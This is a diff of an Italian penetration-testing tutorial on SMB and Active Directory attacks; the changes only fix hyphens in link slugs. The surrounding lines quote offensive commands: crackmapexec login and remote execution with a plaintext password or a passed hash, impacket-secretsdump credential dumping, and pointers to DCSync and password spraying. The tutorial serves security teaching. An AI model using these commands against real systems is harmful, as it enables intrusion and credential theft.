@@ -172,7 +172,7 @@ enum4linux-ng -A 10.10.10.10
     Lockout duration: 30 min
 ```
 
-**Lettura dell'output:** hai la lista utenti completa con RID, i gruppi privilegiati (`Domain Admins`, `Backup Operators`) e la policy di lockout. `svc_backup` in `Backup Operators` può fare DCSync se ha `SeBackupPrivilege` — target ad alta priorità. Usa questi dati per calibrare il [password spraying via SMB](https://hackita.it/articoli/passwordspraying/).
+**Lettura dell'output:** hai la lista utenti completa con RID, i gruppi privilegiati (`Domain Admins`, `Backup Operators`) e la policy di lockout. `svc_backup` in `Backup Operators` può fare DCSync se ha `SeBackupPrivilege` — target ad alta priorità. Usa questi dati per calibrare il [password spraying via SMB](https://hackita.it/articoli/password-spraying/).
 
 ### Ricerca di file sensibili negli share
 
@@ -211,7 +211,7 @@ cat deploy_config.xml
 </configuration>
 ```
 
-**Lettura dell'output:** credenziali del service account di deployment in chiaro. Testa immediatamente con `crackmapexec smb 10.10.10.10 -u svc_deploy -p 'D3pl0y_2026!' --shares`. Approfondisci la raccolta di credenziali dalla rete nella [guida al credential harvesting](https://hackita.it/articoli/credentialharvesting/).
+**Lettura dell'output:** credenziali del service account di deployment in chiaro. Testa immediatamente con `crackmapexec smb 10.10.10.10 -u svc_deploy -p 'D3pl0y_2026!' --shares`. Approfondisci la raccolta di credenziali dalla rete nella [guida al credential harvesting](https://hackita.it/articoli/credential-harvesting/).
 
 ## 4. Tecniche Offensive
 
@@ -275,7 +275,7 @@ SMB    10.10.10.50  445  SRV-FILE  [+] Enumerated shares:
 SMB    10.10.10.50  445  SRV-FILE  [-] corp.local\administrator:31d6cfe0... STATUS_LOGON_FAILURE
 ```
 
-**Cosa fai dopo:** `Pwn3d!` significa che hai admin locale. Esegui comandi: `crackmapexec smb 10.10.10.50 -u administrator -H [hash] -x "whoami"`. Scarica SAM/SYSTEM: `impacket-secretsdump corp.local/administrator@10.10.10.50 -hashes [hash]`. Approfondisci la tecnica nella [guida al pass-the-hash](https://hackita.it/articoli/passthehash/).
+**Cosa fai dopo:** `Pwn3d!` significa che hai admin locale. Esegui comandi: `crackmapexec smb 10.10.10.50 -u administrator -H [hash] -x "whoami"`. Scarica SAM/SYSTEM: `impacket-secretsdump corp.local/administrator@10.10.10.50 -hashes [hash]`. Approfondisci la tecnica nella [guida al pass-the-hash](https://hackita.it/articoli/pass-the-hash/).
 
 **Esecuzione remota con PsExec (impacket)**
 
